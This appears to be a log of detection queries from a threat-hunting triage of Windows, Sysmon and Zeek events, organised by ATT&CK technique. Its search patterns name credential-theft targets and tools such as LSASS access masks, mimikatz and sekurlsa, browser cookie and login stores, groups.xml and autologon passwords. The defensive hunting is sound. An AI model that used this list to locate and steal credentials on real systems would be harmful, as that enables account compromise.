| q-d59dda2e87 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1CS"} | None |  |
| q-43eefdf14b | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1C1"} | None |  |
| q-267caf1a1f | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1CS"} | None |  |
| q-16b456a4c0 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1CS"} | None |  |
| q-35d7e25d5a | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-1eb5b12851 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-43b81d227e | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-6d6f32f915 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-088325cb67 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlFBP"} | None |  |
| q-5d1ac8a524 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1Cy"} | None |  |
| q-60afd994e9 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlFD4"} | None |  |
| q-fdd0079597 | triage T1110 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None | F13 |
| q-cbbe71f1a9 | triage T1110 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-c920f410cb | triage T1110 step 1 | search | {"dataset": "windows.security", "query": "event.code:4776", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.TargetUserName", "win.Status", "win.Workstation", "source.ip", "user.name"], "size": 10, "sort": "asc"} | 1 | F12, F16 |
| q-7f8e66bdee | triage T1110 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*password* OR process.command_line:*pass*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "process.command_line", "user.name"], "s… | 1 | F13 |
| q-6c8dbaec60 | triage T1110 step 2 | search | {"dataset": "windows.security", "query": "event.code:4656 AND win.ObjectName:SAM", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.ObjectName", "win.ObjectType", "win.AccessMask", "win.ProcessName", "win.SubjectUserName", "win.Ha… | 10 | F14 |
| q-06fb3d2753 | triage T1110 step 2 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.TargetUserName", "win.SubjectUserName", "win.ProcessName", "win.LogonType", "win.IpAddress"], "size": 20, "sort": "asc"} | 15 | F15 |
| q-5849319ecf | triage T1110 step 2 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 326 |  |
| q-2f9efe187a | triage T1110 step 2 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 326 |  |
| q-3eeeccd712 | triage T1110 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x101001)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.Sour… | 7 | F14 |
| q-af268b3085 | triage T1110 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND win.SourceImage:*PowerShell*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.SourceImage", "win.TargetImage", "win.GrantedAccess", "user.name… | 4 |  |
| q-ac9dd48d26 | triage T1110 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None | F12, F14 |
| q-a889c7591c | triage T1110 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-14df441857 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-59a8a19785 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-dde4b70899 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-8ecaf774c8 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-40af3f4ab9 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-4c8b17ac43 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-83bb119a2b | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-e1a7e548b5 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVr3Lv_"} | None |  |
| q-4df1028a5c | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-62663eb627 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-b66a588d2c | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev9J"} | None |  |
| q-359b9ad5ea | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-d28fe61eb1 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-e9e0eb39f8 | triage T1111 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" \| KEEP @timestamp, host.name, process.executable, process.command_line, win.TargetImage, win.GrantedAccess, user.name, _id, _in… | 50 | F17 |
| q-fdf63829fa | triage T1111 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*lsass*\" OR TO_LOWER(process.command_line) LIKE \"*mimikatz*\" OR TO_LOWER(process.command_line) LIKE \"*sekurlsa*\" OR TO… | 1 |  |
| q-b4ecb4a6ec | triage T1111 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" \| STATS c = COUNT(*) BY process.executable, win.GrantedAccess \| SORT c DESC \| LIMIT 30"} | 15 |  |
| q-7d4c5976cd | triage T1111 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*psexec*\" OR TO_LOWER(process.executable) LIKE \"*psexe*\" OR TO_LOWER(process.command_line) LIKE \"*\\\\\\\\*admin$*\" OR… | 8 | F17 |
| q-6e6d51bb49 | triage T1111 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE process.executable LIKE \"*python*\" OR process.parent.executable LIKE \"*python*\" \| KEEP @timestamp, host.name, process.executable, process.command_line, process.parent.executable, us… | 40 |  |
| q-6dada3fcea | triage T1111 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*mfa*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*multi-factor*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*token*\" OR… | 1 |  |
| q-2d77ef31b4 | triage T1111 step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None | F17 |
| q-670425d815 | triage T1111 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND (process.executable LIKE \"*python*\" OR process.executable LIKE \"*PSEXESVC*\") \| KEEP @timestamp, host.name, process.executable, destination.ip, destination.po… | 30 | F17 |
| q-1f3ee6cadb | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPDyDoS"} | None |  |
| q-47494d46f9 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO_tniJ"} | None |  |
| q-014ba534a4 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOYDnci"} | None |  |
| q-0ab9dbfa59 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-a4633e3f7f | triage T1111 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-19384e0ef8 | triage T1187 step 1 | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgH"} | None | F18 |
| q-b659c169a0 | triage T1187 step 1 | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None | F18 |
| q-2deab88bdd | triage T1187 step 1 | aggregate | {"dataset": "zeek", "field": "source.ip", "query": "event.action:http AND (http.request.method:PROPFIND OR http.request.method:OPTIONS OR http.request.method:MOVE)", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 36 |  |
| q-06445b5dd6 | triage T1187 step 1 | aggregate | {"dataset": "zeek", "field": "user_agent.original", "query": "event.action:http", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 62 |  |
| q-edc132ce7b | triage T1187 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND (destination.port == 139 OR destination.port == 445) \| KEEP @timestamp, host.name, process.executable, destination.ip, destination.port, user.name, _id, _index \… | 66 | F19 |
| q-62052803d6 | triage T1187 step 2 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"5140\" OR event.code == \"5145\" \| KEEP @timestamp, host.name, win.ShareName, win.SubjectUserName, win.IpAddress, win.RelativeTargetName, _id, _index \| SORT @timestam… | 60 | F19 |
| q-9b2a25af0b | triage T1187 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.command_line LIKE \"*webdav*\" OR process.command_line LIKE \"*OfficeSupplies*\" OR process.command_line LIKE \"*DavClnt*\" OR process.command_line LIKE … | 5 | F18 |
| q-5f210833ba | triage T1187 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (win.TargetFilename LIKE \"*OfficeSupplies*\" OR win.TargetFilename LIKE \"*.lnk\" OR win.TargetFilename LIKE \"*.scf\" OR win.TargetFilename LIKE \"*.url\" OR w… | 4 | F18 |
| q-61aca5a03d | triage T1187 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None | F18 |
| q-4bce101f03 | triage T1187 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTWI7pZ"} | None |  |
| q-71535a3b4f | triage T1187 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTmcl_4"} | None |  |
| q-1fd84c6203 | triage T1187 step 5 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" AND (destination.ip == \"192.168.0.4\" OR source.ip == \"192.168.0.4\") \| KEEP @timestamp, source.ip, destination.ip, destination.port, network.transport, zeek.conn_state… | 40 |  |
| q-cb5e670a95 | triage T1187 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4624\" AND win.LogonType == \"3\" \| KEEP @timestamp, host.name, win.TargetUserName, win.IpAddress, win.LogonProcessName, win.AuthenticationPackageName, _id, _index \| … | 40 |  |
| q-60d0fe94ae | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-6e10c0f75b | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-94f92221f2 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-ab296bb73c | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTWI7pZ"} | None |  |
| q-fb13d53fc4 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTmcl_4"} | None |  |
| q-5e09e72078 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgH"} | None |  |
| q-5ac3dbceb6 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgH"} | None |  |
| q-78513016c9 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-3dd16721e9 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQt-"} | None |  |
| q-e220840632 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQt-"} | None |  |
| q-a921c789ce | triage T1187 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKDB"} | None |  |
| q-365ea38779 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqgghU"} | None |  |
| q-6b0e4a24e6 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqgghU"} | None |  |
| q-6cfe7dbd49 | triage T1212 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" \| KEEP @timestamp, host.name, process.executable, win.TargetImage, win.GrantedAccess, user.name, _id, _index \| LIMIT 50"} | 50 | F20 |
| q-0fe274b415 | triage T1212 step 1 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (win.ScriptBlockText LIKE \"*lsass*\" OR win.ScriptBlockText LIKE \"*Mimikatz*\" OR win.ScriptBlockText LIKE \"*DumpCred*\" OR win.ScriptBlockText LIKE \"*… | 3 |  |
| q-343208f2f5 | triage T1212 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (win.ScriptBlockText LIKE \"*Invoke-SeaDuke*\" OR win.ScriptBlockText LIKE \"*SeaDuke*\" OR win.ScriptBlockText LIKE \"*Get-Process -IncludeUserName*\" OR … | 6 |  |
| q-10f4602a7b | triage T1212 step 2 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4769\" OR event.code == \"4768\" \| KEEP @timestamp, host.name, win.TargetUserName, win.IpAddress, win.Status, win.TicketEncryptionType, win.TicketOptions, _id, _index … | 42 | F20 |
| q-302b1cd631 | triage T1212 step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZJhF-L"} | None | F20 |
| q-f535a175d0 | triage T1212 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.command_line LIKE \"*lsass*\" OR process.command_line LIKE \"*mimikatz*\" OR process.command_line LIKE \"*sekurlsa*\" OR process.command_line LIKE \"*pro… | 1 | F20 |
| q-b4b2c8cd74 | triage T1212 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" AND process.executable NOT LIKE \"*svchost*\" \| KEEP @timestamp, host.name, process.executable, win.TargetImage, win.GrantedAcc… | 30 | F20 |
| q-aca06eed4d | triage T1212 step 4 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE event.code == \"7045\" \| KEEP @timestamp, host.name, win.ServiceName, win.ImagePath, win.ServiceType, win.StartType, _id, _index \| LIMIT 20"} | 5 |  |
| q-f2f85d4a35 | triage T1212 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.command_line LIKE \"*Invoke-*\" OR process.command_line LIKE \"*psexec*\" OR process.command_line LIKE \"*PSEXESVC*\" OR process.command_line LIKE \"*pow… | 15 |  |
| q-143617db81 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOkOj38"} | None |  |
| q-b4b40c3083 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOlP3A4"} | None |  |
| q-1e2e0169c1 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOYDnci"} | None |  |
| q-11761fe195 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-223d8b2226 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn01Pa"} | None |  |
| q-ffc3b6a04d | triage T1212 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZJhF-L"} | None |  |
| q-c81a91273e | triage T1539 step 1 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Cookie* OR win.ScriptBlockText:*Login* OR win.ScriptBlockText:*sqlite* OR win.ScriptBlockText:*Chrome* OR win.ScriptBlockText:*Edge*)", "time_from": null, "time_to": null, "f… | 0 |  |
| q-28dddb50ac | triage T1539 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 11 AND (TO_LOWER(win.TargetFilename) LIKE \"*cookies*\" OR TO_LOWER(win.TargetFilename) LIKE \"*login data*\" OR TO_LOWER(win.TargetFilename) LIKE \"*webcache*\" OR TO_LOWE… | ERROR |  |
| q-62d84c5515 | triage T1539 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*cookies*\" OR TO_LOWER(win.TargetFilename) LIKE \"*login data*\" OR TO_LOWER(win.TargetFilename) LIKE \"*webcache*\" OR TO_… | 9 | F21 |
| q-6944599139 | triage T1539 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*cookie*\" OR TO_LOWER(process.command_line) LIKE \"*login data*\" OR TO_LOWER(process.command_line) LIKE \"*webcache*\" OR… | 5 | F21 |
| q-292d423dd3 | triage T1539 step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None | F21 |
| q-3d41f30e1d | triage T1539 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND user.name == \"pbeesly\" \| KEEP @timestamp, host.name, process.executable, process.command_line, _id, _index \| LIMIT 50"} | 50 |  |
| q-ff75d888db | triage T1539 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4663\" AND (TO_LOWER(win.ObjectName) LIKE \"*cookies*\" OR TO_LOWER(win.ObjectName) LIKE \"*login data*\" OR TO_LOWER(win.ObjectName) LIKE \"*webcache*\" OR TO_LOWER(wi… | 30 |  |
| q-6bfb38ccdf | triage T1539 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*appdata*\" AND (TO_LOWER(win.TargetFilename) LIKE \"*google*\" OR TO_LOWER(win.TargetFilename) LIKE \"*microsoft*edge*\" OR… | 4 | F21 |
| q-f301d38040 | triage T1539 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4663\" AND (TO_LOWER(win.ObjectName) LIKE \"*cookies*\" OR TO_LOWER(win.ObjectName) LIKE \"*login data*\" OR TO_LOWER(win.ObjectName) LIKE \"*webcache*\" OR TO_LOWER(wi… | 0 |  |
| q-720a04aeb8 | triage T1539 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*officesupplies*\" OR TO_LOWER(win.TargetFilename) LIKE \"*.7z\" OR TO_LOWER(win.TargetFilename) LIKE \"*downloads*\") \| KE… | 20 | F21 |
| q-35b9d75093 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-e7b4e8850b | triage T1539 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-396b0dcf27 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTWI7pZ"} | None |  |
| q-3925172378 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOZEq4k"} | None |  |
| q-8a33681e65 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-b5ade2e758 | triage T1552 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None | F22 |
| q-c3c09d45be | triage T1552 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None | F23 |
| q-d0301eb2f2 | triage T1552 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" \| WHERE TO_LOWER(process.command_line) LIKE \"*password*\" OR TO_LOWER(process.command_line) LIKE \"*credential*\" OR TO_LOWER(process.command_line) LIKE \"*unattend… | 0 |  |
| q-98204c3e52 | triage T1552 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" \| WHERE TO_LOWER(win.TargetFilename) LIKE \"*.pfx*\" OR TO_LOWER(win.TargetFilename) LIKE \"*.key*\" OR TO_LOWER(win.TargetFilename) LIKE \"*.pem*\" OR TO_LOWER(win… | 1 | F22 |
| q-c4176ef8d9 | triage T1552 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None | F22 |
| q-f71e492cb6 | triage T1552 step 3 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"5145\" OR event.code == \"4663\" \| WHERE TO_LOWER(win.RelativeTargetName) LIKE \"*groups.xml*\" OR TO_LOWER(win.ObjectName) LIKE \"*groups.xml*\" OR TO_LOWER(win.Relat… | 3 | F24 |
| q-586ef7f6a1 | triage T1552 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*unattend*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*sysvol*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*groups.x… | 5 |  |
| q-72e4e0d22c | triage T1552 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4663\" \| WHERE TO_LOWER(win.ObjectName) LIKE \"*downloads*\" OR TO_LOWER(win.ObjectName) LIKE \"*.pfx*\" OR TO_LOWER(win.ObjectName) LIKE \"*credential*\" OR TO_LOWER(… | 0 |  |
| q-bff8ed6d1d | triage T1552 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND TO_LOWER(process.executable) LIKE \"*powershell*\" \| KEEP @timestamp, host.name, user.name, process.executable, process.command_line, _id, _index"} | 12 |  |
| q-a892a4d70c | triage T1552 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"13\" \| WHERE TO_LOWER(registry.path) LIKE \"*winlogon*\" OR TO_LOWER(registry.path) LIKE \"*autologon*\" OR TO_LOWER(registry.path) LIKE \"*defaultpassword*\" OR TO_LOWE… | 12 | F25 |
| q-2ce4288327 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-c3ff7c25da | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-636beaee86 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-ce12c39c48 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-ef9bc32534 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-9a5fa16034 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-360a31fea9 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-e2a3892c89 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aUm"} | None |  |
| q-b589084f3c | triage T1552 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aUm"} | None |  |
| q-c3966310ec | triage T1552 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7E__C"} | None |  |
| q-94518aa55e | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItKT-1UI"} | None |  |
| q-a3c9e518e3 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3W"} | None |  |
| q-c52e4cc4c7 | triage T1555 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000 OR win.GrantedAccess:0x1400… | 33 | F26, F28, F29 |
| q-610e9d9a93 | triage T1555 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-1d225eb938 | triage T1555 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND win.SourceImage:*PowerShell*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "win.SourceImage", "win.GrantedAccess", "win.Ca… | 4 |  |
| q-440636c43c | triage T1555 step 2 | search | {"dataset": "windows.security", "query": "event.code:4663 AND win.ObjectName:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.ObjectName", "win.ProcessName", "win.AccessMask", "win.SubjectUserName", "win.AccessList", "us… | 6 | F27 |
